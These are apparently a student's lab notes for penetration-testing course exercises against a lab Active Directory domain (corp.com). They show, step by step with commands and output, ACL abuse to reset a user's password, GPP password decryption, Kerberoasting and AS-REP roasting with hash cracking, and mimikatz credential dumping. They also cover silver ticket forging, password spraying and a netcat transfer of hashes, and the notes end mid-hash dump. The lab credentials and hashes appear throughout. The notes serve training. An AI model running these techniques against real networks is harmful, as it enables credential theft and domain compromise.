
# 21 - AD Enumeration

### 21.4.2

3. **Capstone Exercise**: Start VM Group 2 and log in as _stephanie_ to CLIENT75. From CLIENT75, enumerate the object permissions for the domain users. Once weak permissions have been identified, use them to take full control over the account and use it to log in to the domain. Once logged in, repeat the enumeration process using techniques shown in this Module to obtain the flag.

- Start up PowerView
```powershell
cd c:\tools

powershell -ep bypass

Import-Module .\PowerView.ps1
```


```powershell
# Enumerate users
net user /domain
	The request will be processed at a domain controller for domain corp.com.
	User accounts for \\DC1.corp.com
	-------------------------------------------------------------------------------
	Administrator            dave                     dennis
	Guest                    iis_service              jeff
	jeffadmin                jen                      krbtgt
	michelle                 pete                     robert
	stephanie
	The command completed successfully.


# Enumerate groups
net group /domain
	The request will be processed at a domain controller for domain corp.com.
	Group Accounts for \\DC1.corp.com
	-------------------------------------------------------------------------------
	*Cloneable Domain Controllers
	*Debug
	*Development Department
	*DnsUpdateProxy
	*Domain Admins
	*Domain Computers
	*Domain Controllers
	*Domain Guests
	*Domain Users
	*Enterprise Admins
	*Enterprise Key Admins
	*Enterprise Read-only Domain Controllers
	*Group Policy Creator Owners
	*Key Admins
	*Management Department
	*Protected Users
	*Read-only Domain Controllers
	*Sales Department
	*Schema Admins
	The command completed successfully.

# Enumerate groups
Get-NetGroup "Management Department" | select member
	member
	------
	CN=jen,CN=Users,DC=corp,DC=com

Get-NetGroup "Development Department" | select member
	member
	------
	{CN=Management Department,DC=corp,DC=com, CN=pete,CN=Users,DC=corp,DC=com, CN=dave,CN=Users,DC=corp,DC=com}


Get-NetGroup "Sales Department" | select member
	member
	------
	{CN=Development Department,DC=corp,DC=com, CN=pete,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}


Get-NetGroup "Domain Admins" | select member
	member
	------
	{CN=jeffadmin,CN=Users,DC=corp,DC=com, CN=Administrator,CN=Users,DC=corp,DC=com}


# Enumerate list of domain endpoints
Get-NetComputer | select operatingsystem,dnshostname
	operatingsystem              dnshostname
	---------------              -----------
	Windows Server 2022 Standard DC1.corp.com        #--> 192.168.165.70
	Windows Server 2022 Standard web04.corp.com      #--> 192.168.165.72
	Windows Server 2022 Standard FILES04.corp.com    #--> 192.168.165.73
	Windows 11 Enterprise        client74.corp.com   #--> 192.168.165.74
	Windows 11 Enterprise        client75.corp.com   #--> 192.168.165.75
	Windows 10 Pro               CLIENT76.corp.com   #--> 192.168.165.76


# Enumerate Domain Shares
Find-DomainShare
	Name           Type Remark                 ComputerName
	----           ---- ------                 ------------
	ADMIN$   2147483648 Remote Admin           DC1.corp.com
	C$       2147483648 Default share          DC1.corp.com
	IPC$     2147483651 Remote IPC             DC1.corp.com
	NETLOGON          0 Logon server share     DC1.corp.com
	SYSVOL            0 Logon server share     DC1.corp.com
	ADMIN$   2147483648 Remote Admin           web04.corp.com
	backup            0                        web04.corp.com
	C$       2147483648 Default share          web04.corp.com
	IPC$     2147483651 Remote IPC             web04.corp.com
	ADMIN$   2147483648 Remote Admin           FILES04.corp.com
	C                 0                        FILES04.corp.com
	C$       2147483648 Default share          FILES04.corp.com
	docshare          0 Documentation purposes FILES04.corp.com
	IPC$     2147483651 Remote IPC             FILES04.corp.com
	Tools             0                        FILES04.corp.com
	Users             0                        FILES04.corp.com
	Windows           0                        FILES04.corp.com
	ADMIN$   2147483648 Remote Admin           client74.corp.com
	C$       2147483648 Default share          client74.corp.com
	IPC$     2147483651 Remote IPC             client74.corp.com
	ADMIN$   2147483648 Remote Admin           client75.corp.com
	C$       2147483648 Default share          client75.corp.com
	IPC$     2147483651 Remote IPC             client75.corp.com
	sharing           0                        client75.corp.com
	ADMIN$   2147483648 Remote Admin           CLIENT76.corp.com
	C$       2147483648 Default share          CLIENT76.corp.com
	IPC$     2147483651 Remote IPC             CLIENT76.corp.com


# Enumerate through SYSVOL
dir \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy

type \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
	<?xml version="1.0" encoding="utf-8"?>
	<Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
	  <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
	          name="Administrator (built-in)"
	          image="2"
	          changed="2012-05-03 11:45:20"
	          uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
	    <Properties
	          action="U"
	          newName=""
	          fullName="admin"
	          description="Change local admin"
	          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
	          changeLogon="0"
	          noChange="0"
	          neverExpires="0"
	          acctDisabled="0"
	          userName="Administrator (built-in)"
	          expires="2016-02-10" />
	  </User>
	</Groups>


# Crack cpassword IN KALI
gpp-decrypt +bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE                                                                 
	P@$$w0rd


# Enumerate file share
dir \\files04\docshare\docs\do-not-share\

type \\files04\docshare\docs\do-not-share\start-email.txt
	Hi Jeff,
	...
	The username I''m sure you already know, but here you have the brand new auto generated password as well: HenchmanPutridBonbon11
	...
	Stephanie


# Enumerate logged on users
cd .\PSTools\

.\PsLoggedon.exe \\web04
	No one is logged on locally.
	Unable to query resource logons


.\PsLoggedon.exe \\files04
	Users logged on locally:
	     <unknown time>             CORP\jeff
	Unable to query resource logons


.\PsLoggedon.exe \\client74
	Users logged on locally:
	     <unknown time>             CORP\jeffadmin
	Unable to query resource logons

.\PsLoggedon.exe \\client75
	Users logged on locally:
	     <unknown time>             CORP\dave
	     7/27/2024 11:31:15 PM      CORP\stephanie

.\PsLoggedon.exe \\client76
	Error opening HKEY_USERS for \\client76
	Users logged on via resource shares:
	     7/27/2024 11:33:57 PM      CORP\stephanie


# Get list of all GenericAll SIDs for stephanie
Get-ObjectAcl -Identity "stephanie" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
	SecurityIdentifier                           ActiveDirectoryRights
	------------------                           ---------------------
	S-1-5-21-1987370270-658905905-1781884369-512            GenericAll
	S-1-5-32-548                                            GenericAll
	S-1-5-18                                                GenericAll
	S-1-5-21-1987370270-658905905-1781884369-519            GenericAll

# Get list of all GenericAll SIDs for jeff
Get-ObjectAcl -Identity "jeff" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
	SecurityIdentifier                           ActiveDirectoryRights
	------------------                           ---------------------
	S-1-5-21-1987370270-658905905-1781884369-512            GenericAll
	S-1-5-32-548                                            GenericAll
	S-1-5-18                                                GenericAll
	S-1-5-21-1987370270-658905905-1781884369-519            GenericAll


# Convert SIDs to group names
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-512
	CORP\Domain Admins

Convert-SidToName S-1-5-32-548
	BUILTIN\Account Operators

Convert-SidToName S-1-5-18
	Local System

Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-519
	CORP\Enterprise Admins


# Try a different way...  (got from Discord)
Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft
	IdentityReferenceName ActiveDirectoryRights             AceType ObjectDN
	--------------------- ---------------------             ------- --------
	DC1$                             GenericAll AccessAllowedObject CN=DFSR-LocalSettings,CN=DC1,OU=Domain Controllers,DC=cor...
	DC1$                             GenericAll AccessAllowedObject CN=Domain System Volume,CN=DFSR-LocalSettings,CN=DC1,OU=D...
	DC1$                             GenericAll AccessAllowedObject CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-Lo...
	stephanie                        GenericAll       AccessAllowed CN=Management Department,DC=corp,DC=com
	stephanie                        GenericAll       AccessAllowed CN=robert,CN=Users,DC=corp,DC=com


# Enumerate robert
Get-ObjectAcl -Identity "robert" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
	SecurityIdentifier                            ActiveDirectoryRights
	------------------                            ---------------------
	S-1-5-21-1987370270-658905905-1781884369-512             GenericAll
	S-1-5-21-1987370270-658905905-1781884369-1104            GenericAll
	S-1-5-32-548                                             GenericAll
	S-1-5-18                                                 GenericAll
	S-1-5-21-1987370270-658905905-1781884369-519             GenericAll

Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
	CORP\stephanie


# Change robert's password (need `net user` as PS requires old password & otherwise errors out)
 net user robert P@ssword /domain
	The request will be processed at a domain controller for domain corp.com.
	The command completed successfully.


# Login to \\client74
xfreerdp /cert-ignore /compression /auto-reconnect /u:robert /p:P@ssword /d:corp.com /v:192.168.208.74

##### In new RDP window
powershell.exe

Start-Process powershell.exe -Verb runas

# In new PS window
Get-ChildItem -Path C:\ -Filter proof.txt -Recurse -ErrorAction SilentlyContinue -Force
	    Directory: C:\Users\administrator\Desktop
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	-a----         7/28/2024   8:01 PM             78 proof.txt

type C:\Users\administrator\Desktop\proof.txt
```



# 22 - AD Authentication

### 22.2.3

2. Once VM Group 2 is started, the domain _corp.com_ has been slightly modified. Use the techniques from this section to obtain another plaintext password by performing Kerberoasting and enter it as answer to this exercise. To crack the TGS-REP hash, create and utilize a rule file which adds a "1" to the passwords of **rockyou.txt**. To perform the attack, you can use the user _jeff_ with the password **HenchmanPutridBonbon11**.

- RDP in & use Rebus
```powershell
cd C:\Tools\
	.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
	   ______        _
	  (_____ \      | |
	   _____) )_   _| |__  _____ _   _  ___
	  |  __  /| | | |  _ \| ___ | | | |/___)
	  | |  \ \| |_| | |_) ) ____| |_| |___ |
	  |_|   |_|____/|____/|_____)____/(___/
	
	  v2.1.2
	
	[*] Action: Kerberoasting
	
	[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
	[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
	
	[*] Target Domain          : corp.com
	[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
	
	[*] Total kerberoastable users : 1
	
	[*] SamAccountName         : pete
	[*] DistinguishedName      : CN=pete,CN=Users,DC=corp,DC=com
	[*] ServicePrincipalName   : http/files04.corp.com
	[*] PwdLastSet             : 8/15/2024 5:01:40 PM
	[*] Supported ETypes       : RC4_HMAC_DEFAULT
	[*] Hash written to C:\Tools\hashes.kerberoast
	
	[*] Roasted hashes written to : C:\Tools\hashes.kerberoast
```

- Transfer files to Kali
```kali
nc -nlvp 5555 > hashes.kerberoast
```

```powershell
.\nc64.exe 192.168.45.245 5555 < .\hashes.kerberoast
```

- Create rule to prepend 1
```bash
vim ruleOf1.rule
	## Add 1
	^1
	$1
```

- Crack
```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r ruleof1.rule --force
	2d51c0cad3399d3cb6f8df4d3fe8fe654da1e16c592496dd9cb547c7f86e545390e13802b6f99f08ea0057acfa03e11b178a0777faa72a8d3c0307a8d19a05c03207:MattLovesAutumn1
	   
	Session..........: hashcat
	Status...........: Cracked
	Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
	Hash.Target......: $krb5tgs$23$*pete$corp.com$http/files04.corp.com@co...c03207
	Time.Started.....: Thu Aug 15 20:43:35 2024, (13 secs)
	Time.Estimated...: Thu Aug 15 20:43:48 2024, (0 secs)
```


## Silver Ticket

### 22.2.4

1. Follow the steps outlined in this section to forge a silver ticket for _jeffadmin_ in order to access the web page located at **hxxp://web04**.
   Review the source code of the page and find the flag.

- Check current user's access to the resource of the HTTP SPN mapped to _iis_service_
```powershell
iwr -UseDefaultCredentials http://web04
	iwr : Server Error
	401 - Unauthorized: Access is denied due to invalid credentials.
	...
```

- Verify local admin access
```powershell
net localgroup administrators    OR
get-localgroupmember administrators
	ObjectClass Name                   PrincipalSource
	----------- ----                   ---------------
	User        CLIENT75\Administrator Local
	User        CLIENT75\offsec        Local
	User        CORP\dave              ActiveDirectory
	Group       CORP\Domain Admins     ActiveDirectory
	User        CORP\jeff              ActiveDirectory
```

- Verify established sessions
```powershell

```

- Start powershell as admin
```powershell
Start-Process powershell.exe -Verb runas
```

- Get the SPN NTLM hash
```powershell
cd C:\Tools
.\mimikatz.exe

mimikatz # privilege::debug
	Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
	...
	Authentication Id : 0 ; 1196098 (00000000:00124042)
	Session           : Service from 0
	User Name         : iis_service
	Domain            : CORP
	Logon Server      : DC1
	Logon Time        : 8/16/2024 1:12:06 PM
	SID               : S-1-5-21-1987370270-658905905-1781884369-1109
	        msv :
	         [00000003] Primary
	         * Username : iis_service
	         * Domain   : CORP
	         * NTLM     : 4d28cf5252d39971419580a51484ca09
	         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
	         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
	        ...
```

- Get domain SID
```powershell
whoami /user
	USER INFORMATION
	----------------
	User Name SID
	========= =============================================
	corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105       #<-- NOTE:  didn't work w/ the last `-1105`.  Worked once removed.
```

- Create ticket w/ Mimikatz
```powershell
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
	User      : jeffadmin
	Domain    : corp.com (CORP)
	SID       : S-1-5-21-1987370270-658905905-1781884369-1105
	User Id   : 500
	Groups Id : *513 512 520 518 519
	ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
	Service   : http
	Target    : web04.corp.com
	Lifetime  : 8/16/2024 1:44:56 PM ; 8/14/2034 1:44:56 PM ; 8/14/2034 1:44:56 PM
	-> Ticket : ** Pass The Ticket **
	
	 * PAC generated
	 * PAC signed
	 * EncTicketPart generated
	 * EncTicketPart encrypted
	 * KrbCred generated
	
	Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session
```

- Verify list of cached Kerberos tickets
```powershell
klist
	Current LogonId is 0:0x2fe07f
	Cached Tickets: (1)
	
	#0>     Client: jeffadmin @ corp.com
	        Server: http/web04.corp.com @ corp.com
	        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
	        Start Time: 8/16/2024 13:44:56 (local)
	        End Time:   8/14/2034 13:44:56 (local)
	        Renew Time: 8/14/2034 13:44:56 (local)
	        Session Key Type: RSADSI RC4-HMAC(NT)
	        Cache Flags: 0
	        Kdc Called:
```

- Test access again
```powershell
iwr -UseDefaultCredentials http://web04
	StatusCode        : 200
	StatusDescription : OK
	Content           : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
	                    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
	                    <html xmlns="http://www.w3.org/1999/xhtml">
	                    <head>
	                    <meta http-equiv="Content-Type" cont...
	RawContent        : HTTP/1.1 200 OK
```

- Get flag in source:
```powershell
(iwr -UseDefaultCredentials http://web04).Content | findstr /i "OS{"
	<!-- OS{5fc3d12c8c19c5821db5b17e38aea13d} -->
```


## DC Sync - Capstones

### 22.2.5

2. **Capstone Exercise**: Once VM Group 2 is started, the domain _corp.com_ has been modified.
   Use the techniques from this Module to obtain access to the user account _maria_ and log in to the domain controller.
   To perform the initial enumeration steps you can use _pete_ with the password _Nexus123!_.
   You'll find the flag on the Desktop of the domain administrator on DC1.
   If you obtain a hash to crack, create and utilize a rule file which adds nothing, a "1", or a "!" to the passwords of **rockyou.txt**

- Query domain for hashes via **impacket**
```kali
impacket-GetNPUsers -dc-ip 192.168.170.70 -request -outputfile hashes.capstone2 corp.com/pete
	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
	
	Password:
	Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC      
	----  ----------------------------------------  --------------------------  --------------------------  --------
	mike                                            2024-08-19 20:05:49.817000  <never>                     0x400200 
	dave  CN=Development Department,DC=corp,DC=com  2024-08-19 20:05:48.988875  2024-08-19 20:20:28.770133  0x410200 
	
	
	
	$krb5asrep$23$mike@CORP.COM:acfc5b2a7a6eb07ef47b1968bb813c2d$67935e619006df71e1436afc8d5d956c692f29bc8839b0df831fa16c22f2907fb1472d35f956139f13ff9ba4e36cb0256db253912b3701b5400f111cf7464276ec19be38fa330282fee72de3c26c7a8750e1b1b28967a0752c24dfc59f9b01266a4fe8be05fb338df2cd6577079db7d435efd022f70f36ce3941d8d493cc389e89db31e3df45608d70558ab6939369d63adc25baccd9c1bdd34d55f9601c0c94b9aac09dd9ccbf929748d2b902a500b89abd1b1fc604d3d800171af6a8cf3cb1b9aceb71455d6a66b7a87f8dacc016d536cff26c366773c96548732deaeba08ad84ae154
	$krb5asrep$23$dave@CORP.COM:369edeb7601277f3ea8f8fb827cfcef0$799004c782a7dd5d26b5ceabbacae38d10f728bb190e5b2be4ef209f70854f452b17d24ebbdf0de26f3e8f9d008e53290538d366de5491f0a8db91d585d8e2122a9ed0af68e1e363c38a710b95ae534094128c3a0d4d855ae60063f52324837d32c07ad92a03c5cc1397b4433a3b4d0c0e47502df277c290932594dfec5527675971f4fb879546cc52ce46d1af326cfcc1b30eda30e54244bc4ccca806b683c9fdf39656a45f513ea850b14cae66dda3083075c9bbd44ffcc138c483db7e822b3ebb5e025a8c0f520bdd8bf2c09cfb0f9548faef67d7c85f348d7d87728d13ad685e80ac
```

- Create a the rule file & crack
```kali
echo : > rule_cap2
echo \$1 >> rule_cap2
echo \$! rule_cap2

sudo hashcat -m 18200 hashes.capstone2 /usr/share/wordlists/rockyou.txt -r rule_cap2.txt --force
	$krb5asrep$23$mike@CORP.COM:acfc5b2a7a6eb07ef47b1968bb813c2d$67935e619006df71e1436afc8d5d956c692f29bc8839b0df831fa16c22f2907fb1472d35f956139f13ff9ba4e36cb0256db253912b3701b5400f111cf7464276ec19be38fa330282fee72de3c26c7a8750e1b1b28967a0752c24dfc59f9b01266a4fe8be05fb338df2cd6577079db7d435efd022f70f36ce3941d8d493cc389e89db31e3df45608d70558ab6939369d63adc25baccd9c1bdd34d55f9601c0c94b9aac09dd9ccbf929748d2b902a500b89abd1b1fc604d3d800171af6a8cf3cb1b9aceb71455d6a66b7a87f8dacc016d536cff26c366773c96548732deaeba08ad84ae154:Darkness1099!
Approaching final keyspace - workload adjusted.           
	  
	Session..........: hashcat
	Status...........: Exhausted
	...
```

- RDP into CLIENT75 and use mimikatz
```powershell
xfreerdp /cert-ignore /compression /auto-reconnect /u:mike /p:Darkness1099! /d:corp.com /v:192.168.170.75

whoami /groups
	GROUP INFORMATION
	-----------------
	Group Name                                 Type             SID          Attributes                                     
	========================================== ================ ============ ==================================================
	Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
	BUILTIN\Administrators
	...

# Start a high level powershell terminal for Mimikatz
powershell.exe
Start-Process powershell.exe -Verb RunAs

.\mimikatz.exe
mimikatz # privilege::debug
	Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
	...
	Authentication Id : 0 ; 1206812 (00000000:00126a1c)
	Session           : Service from 0
	User Name         : maria
	Domain            : CORP
	Logon Server      : DC1
	Logon Time        : 8/19/2024 5:06:07 PM
	SID               : S-1-5-21-1987370270-658905905-1781884369-22102
	        msv :
	         [00000003] Primary
	         * Username : maria
	         * Domain   : CORP
	         * NTLM     : 2a944a58d4ffa77137b2c587e6ed7626
	...
```

- Crack
```powershell
hashcat -m 1000 maria.capstone2 /usr/share/wordlists/rockyou.txt -r rule_cap2.txt --force
	2a944a58d4ffa77137b2c587e6ed7626:passwordt_1415
```

- RDP into DC & get flag
```powershell
powershell.exe
Start-Process powershell.exe -Verb runAs

Get-ChildItem -Path C:\Users\ -Filter flag.txt -Recurse -ErrorAction SilentlyContinue -Force
type C:\Users\Administrator\Desktop\flag.txt
```



3. **Capstone Exercise**: Once VM Group 3 is started, the domain _corp.com_ has been modified.
   By examining leaked password database sites, you discovered that the password _VimForPowerShell123!_ was previously used by a domain user.
   Spray this password against the domain users _meg_ and _backupuser_.
   Once you have identified a valid set of credentials, use the techniques from this Module to obtain access to the domain controller.
   You'll find the flag on the Desktop of the domain administrator on DC1. If you obtain a hash to crack, reuse the rule file from the previous exercise.

- Get info, hashes, & pw
```bash
impacket-GetADUsers -all corp.com/pete -dc-ip 192.168.160.70
	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
	
	Password: [Nexus123!]
	[*] Querying 192.168.160.70 for information about domain.
	Name                  Email                           PasswordLastSet      LastLogon           
	--------------------  ------------------------------  -------------------  -------------------
	Administrator                                         2022-08-16 20:27:22.514924  2024-08-20 17:43:07.504166 
	Guest                                                 <never>              <never>             
	krbtgt                                                2022-09-02 19:10:48.458856  <never>             
	dave                                                  2022-09-07 12:54:57.521205  2024-08-20 17:46:28.144796 
	stephanie                                             2022-09-02 19:23:38.779402  2023-09-27 05:07:10.149973 
	jeff                                                  2022-09-02 19:27:20.605496  2023-12-19 02:55:16.010268 
	jeffadmin                                             2022-09-02 19:26:48.889404  2024-01-08 06:47:01.957049 
	iis_service                                           2022-09-07 08:38:43.411468  2023-03-01 06:40:02.088156 
	pete                                                  2022-09-06 15:41:54.756025  2023-02-01 05:42:42.235198 
	jen                                                   2022-09-06 15:43:01.543039  2024-01-08 04:26:03.035484 
	meg                                                   2024-08-20 17:43:05.176042  <never>             
	backupuser                                            2024-08-20 17:43:05.238541  <never>

impacket-GetNPUsers -dc-ip 192.168.160.70 -request -outputfile hashes.cap3 corp.com/pete
	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
	Password:
	Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC      
	----  ----------------------------------------  --------------------------  --------------------------  --------
	dave  CN=Development Department,DC=corp,DC=com  2022-09-07 12:54:57.521205  2024-08-20 17:48:28.160419  0x410200 
	
	$krb5asrep$23$dave@CORP.COM:823ebea37012905d42b4a19098ce4b8d$0f8cf356d090deb872ba8fd610cdd760ce3115a031952b945e2573836b930555815a14ddf34b60469fce9d1340b1016a6a34efca128dcd8cfaac80afe840e7c1b5ea57dbcbb67c88cddcef6e6eeec24c25ad84135b8c36d5762f09150014931dd73596efa739a37f660df7303d317a3979fabb71d5951a446947b6ea5327425ce191dfed81ef6c5cac33d4ceab50edb692a37cfc725f319307240f60d04595c2d47cc812910a6085c06fee10986dc32ef9ba347c343c3af916cb0356399b094123d7ea85163a4fc39fd8615ffb42ee742803aed178945444ce95d082e226bc0b92872006

hashcat -m 18200 hashes.cap3 /usr/share/wordlists/rockyou.txt -r rule_cap2.txt --force
	...
	e742803aed178945444ce95d082e226bc0b92872006:Flowers1
	
	Session..........: hashcat
	Status...........: Cracked
```


- RDP into Client75 via `dave:Flowers1`
```powershell
cd C:\Tools
powershell.exe
powershell -ep bypass

.\Spray-Passwords.ps1 -Pass VimForPowerShell123! -Admin
	WARNING: also targeting admin accounts.
	Performing brute force - press [q] to stop the process and print results...
	Guessed password for user: 'meg' = 'VimForPowerShell123!'
	Users guessed are:
	 'meg' with password: 'VimForPowerShell123!'


# Find Domain Admins
Import-Module .\PowerView.ps1

Get-NetGroup "Domain Admins" | select member
	member
	------
	{CN=backupuser,CN=Users,DC=corp,DC=com, CN=jeffadmin,CN=Users,DC=corp,DC=com, CN=Administrator,CN=Users,DC=corp,DC=com}


# Kerberoast
.\Rubeus.exe kerberoast /outfile:hashes
	   ______        _
	  (_____ \      | |
	   _____) )_   _| |__  _____ _   _  ___
	  |  __  /| | | |  _ \| ___ | | | |/___)
	  | |  \ \| |_| | |_) ) ____| |_| |___ |
	  |_|   |_|____/|____/|_____)____/(___/
	
	  v2.1.2
	
	
	[*] Action: Kerberoasting
	
	[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
	[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
	
	[*] Target Domain          : corp.com
	[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
	
	[*] Total kerberoastable users : 2
	
	
	[*] SamAccountName         : iis_service
	[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
	[*] ServicePrincipalName   : HTTP/web04.corp.com
	[*] PwdLastSet             : 9/7/2022 5:38:43 AM
	[*] Supported ETypes       : RC4_HMAC_DEFAULT
	[*] Hash written to C:\Tools\hashes
	
	
	[*] SamAccountName         : backupuser
	[*] DistinguishedName      : CN=backupuser,CN=Users,DC=corp,DC=com
	[*] ServicePrincipalName   : http/files04.corp.com
	[*] PwdLastSet             : 8/20/2024 2:43:05 PM
	[*] Supported ETypes       : RC4_HMAC_DEFAULT
	[*] Hash written to C:\Tools\hashes
	
	[*] Roasted hashes written to : C:\Tools\hashes
	PS C:\Tools> type hashes
	$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com@corp.com*$960C30E681FF6F4435457BFC91B4F9AF$2211870884FF8DA1C0604AF3CC542D939388EF2D0B2E6C330FD3E7DF6FF8F7751534D5957C97681880F2AADEE74506B20F909C039EC8B0C12F17BFC55A989B7552FDCDFA6F8A48B7C83AE4AB2ADED3CC61B2B85859AE2AAA89378BDAE1223CA45C39B7CF221D553FDCC5DBA11F223F1F408DDDF276DB36EC70C53BFA6E76D59A61B3F8E474643E807857B8678B8DC73990E222100D3220058ED9300ABC3ECC64AD16EB746CBC3F1F9DD810005E520DB7F756AF20AAB5B56CA971A2F1593D3350F92755DC27D05E51AB1A249BCE2ED90C0DDDD74C04939C08758C1C79DF7085B5E648930CA6B25C5C29EEAA8BD85F2D51D656C4BE0DB28D2B362E91C69B3C0DDBAB159CF6F535E89CA8557BA2544E4FFEAA6B77EE010B27759EB3C7C4D98BD7CC96FAA5439C20A55A615477D40629F76483C267CE79B0865B44D65CE5DEED05B88B8884EAC883BD2C897D952B4D9B3CF9D893AC29EDA659C0E2888CCFC92F913246416B62590796C6676BC88B17183043405F5D40DAB9878314A30E75E205CADF2F9699C737BB4D22F6189F486D7538C26E9D857128E93C4F9D624ED5AA09C454CECFC0ADA452A5B0872A7FB64E35A66471A3681D378A93F25CAF86EA28E221CD6C528DE2AA44717D82BFDD8FCC28EE0F9D47176309DA9E7EFBB93BD51FD63A5092555894AAEC63D91DEDB08297F3CE2031470309AABA29735F03551328181358AF260D13BEB17F9A027B9BBE2583E077F11F737C016C589DEADF0F2EE93EE01990394871CD0858C1DF7A4071DF06EAACA0BC5E49A077624961904F8DEAF1C9705567817CE8B7ACC7825F9170C30F66FD7B41B156EB02E742AB8DE086061F833277ACA8EA4EF65C50C19FF6A06DAE14690155A5BD5D71AEF5944EBD836A092EFAB2482126A2146769313554C3C7DF34C03C345D3466CA769DBCE0E231351285D3E22A5D4118195DDCC83B8EE4CFE9641874B367A2A3AFF6CB01F91E14B416843C6C523F5D29F9934000F54634AAE179D71EC7DDF1A54F2C518357DFD66792F70CEA469E008C6D6C8E8663250D0C7280D64BC8E1877B920C588D427B5BA6B03CD09BF173743A9CA0F1D63FFE85C1DAC64BD35EC61E8F14F679D2C93EA6B9EDC34FAF2D7AD8264B1A1200675629155C699FF43F8DAC93396CB6B14479395605CD3780577B7C7883FF742F0385B94F2ECC02885967E58BA0BD296E056ACB161CC4C7ECBBE7637CD9F2952C60A4B667DA02ABA709E5FCEFFD993E37D2047D6067F0667B779E2BFAC796844EF72F4D20318C5A925FDB6BF55083D6677D0509F10DDEF35013A0AC15E73E610985BF75E7D4030942402A2D1526DC6291FF90B23C837957D83B62C52517204D9F997ACDD50648BC11808B25F45C31550FB74F21A45DCD480761C3EBA4751FF4D7F37A9FBE5B23B24BEF93EA38AFE6BE8179E4AA7EF84B8077D7EDE5B69755C3857A6541640430BB153007320044C4666FB66BC897D509ED535D5FAC699909
	$krb5tgs$23$*backupuser$corp.com$http/files04.corp.com@corp.com*$4BE1E2241EFC7B501157CB3FE7C63378$6006C8B30C51CAC9DAE38677D5B0F021D39DC21F6FD7DD660FD8014A7B25AA52298BC408FF8F362C69040E493E6FF0680CC3EEFAF7FF374C7B3F596AFD64A3340CB09F0BA0C981AAF47002C0588E4B47E7958143B541078C1DEBE16876DF1FD74407A1099A300002B2C739042D42F704CEE5F061BA0DB5140B788223F9AB01EEC59BA5629186E5D69613B1E78FF668D88CE26834582F25541219DB98FF454380A4FD0266B7790EF77250C4FEC0111EEBE13F3E73687AB2CD1893AC9BD7E2ADC990422BD2EF2B642F1FB10FC9BF00C6D257B69827A11A93C6102A06820F3BB54A8E4FF1C5964544D0622C5011B6111F366120D6A130F1088EFCBA350606E36E26F89BB2017AA19BFDD0471DA2BDFDDD1EB28377B4E7E558B713809C2359E94E69DD0A7DC34650EEB618B9B8141CF69907B33FADD8536069C7251F18AD2CC6DB68DE2A7D0A66C2D28A8372ABAC95F80EC2ADD211D1503A84C8F2452E7526B04807C14725CAD54E5B99F0F7685225F6445B3F15EE48B7C644649B9EF1B9D62D51D00813CC40C99AD09236F490BFCCCE48ABA7619BC037EA1BB50CC60F6BFB31FCA3162382D09338CCD631323A6DBA9FC8C42D0A99FE88952A977A321E71C7F27BF8A3F517E984F12FF23D72E1DD8A93A0D78765572F38CD178B440546F069DC0B09FF4F241FAF5E4C9A6042BB5C74E7B10276F0062826EE8DED68B16614027D7E20E5BD857F85E8FE05A53893772BE5FC91921EF35B8914AA218392AA8863ACF940970084F3121E1796FC77A0FBF7F86E6FE1C8AB0F69D3FA5DE6EA21595D218CDA9E6C773999B94A9F5F96D8EE6DC271C759FC0132F9F0DB9D288906DDDAF4B25D89EFED5D